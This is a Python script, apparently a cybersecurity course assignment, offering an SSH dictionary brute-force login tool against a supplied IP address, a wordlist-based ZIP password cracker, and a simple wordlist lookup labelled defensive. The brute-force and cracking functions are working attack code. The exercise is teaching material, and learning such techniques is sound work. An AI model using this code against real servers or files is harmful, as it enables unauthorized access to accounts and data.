#!/usr/bin/env python3
# Script:                       Add to challenge 17 to 
# Author:                       Yue Moua
# Date of latest revision:      1/29/2024
# Purpose:                      Challenge 17

import time
import paramiko
import zipfile

def try_extract(zip_file_path, password):
    try:
        with zipfile.ZipFile(zip_file_path) as zf:
            zf.extractall(pwd=bytes(password, 'utf-8'))
            print(f"Successful extraction! Password: {password}")
            return True
    except zipfile.BadZipFile:
        print(f"Failed extraction attempt. Password: {password}")
        time.sleep(1)  # Add a delay of 1 second between attempts
    except Exception as e:
        print(f"Error during extraction: {e}")
    return False

def offensive_ssh(word_list_path, username, ip_address):
    try:
        with open(word_list_path, 'r') as file:
            for word in file:
                password = word.strip()  # Remove leading and trailing whitespaces
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(ip_address, username=username, password=password)
                    print(f"Successful SSH login! Username: {username}, Password: {password}")
                    ssh_client.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"Failed SSH login attempt. Username: {username}, Password: {password}")
                    time.sleep(1)  # Add a delay of 1 second between attempts
    except FileNotFoundError:
        print("File not found. Please provide a valid file path.")

def offensive_zip(word_list_path, zip_file_path):
    try:
        with open(word_list_path, 'rb') as file:
            word_list = [line.decode('latin-1').strip() for line in file.readlines()]

            for password in word_list:
                if try_extract(zip_file_path, password):
                    return

            print("ZIP file extraction failed. Password not found in the word list.")
    except FileNotFoundError:
        print("File not found. Please provide valid file paths.")

def defensive_mode(user_input, word_list_path):
    try:
        with open(word_list_path, 'r', encoding='utf-8', errors='ignore') as file:
            word_list = [line.strip() for line in file]

            if user_input in word_list:
                print(f"The word '{user_input}' was found in the word list.")
            else:
                print(f"The word '{user_input}' was not found in the word list.")
    except FileNotFoundError:
        print("File not found. Please provide a valid file path.")
    except UnicodeDecodeError:
        print("Error decoding the file. Please ensure the file contains valid UTF-8 encoded text.")

def main():
    while True:
        print("\nMenu:")
        print("1. Offensive; SSH Dictionary Iterator (SSH Authentication)")
        print("2. Offensive; ZIP file Password Extraction")
        print("3. Defensive; Password Recognized")
        print("4. Exit")

        choice = input("Enter your choice (1-4): ")

        if choice == '4':
            print("Exiting the program. Goodbye!")
            break
        elif choice == '1':
            word_list_path = input("Enter the path of the word list file: ")
            username = input("Enter the SSH username: ")
            ip_address = input("Enter the SSH server IP address: ")
            offensive_ssh(word_list_path, username, ip_address)
        elif choice == '2':
            word_list_path = input("Enter the path of the word list file: ")
            zip_file_path = input("Enter the path of the password-protected ZIP file: ")
            offensive_zip(word_list_path, zip_file_path)
        elif choice == '3':
            user_input = input("Enter the string to search: ")
            word_list_path = input("Enter the path of the word list file: ")
            defensive_mode(user_input, word_list_path)
        else:
            print("Invalid choice. Please enter a number between 1 and 4.")

if __name__ == "__main__":
    main()

# Ref:
# https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-18/challenges/DEMO.md
# https://github.com/ymoua27/401-challenges/blob/main/ch17.py
# https://www.howtoforge.com/how-to-protect-zip-file-with-password-on-ubuntu-1804/
# https://chat.openai.com/share/39a46759-b984-4338-9f17-b0d9c74f4b22
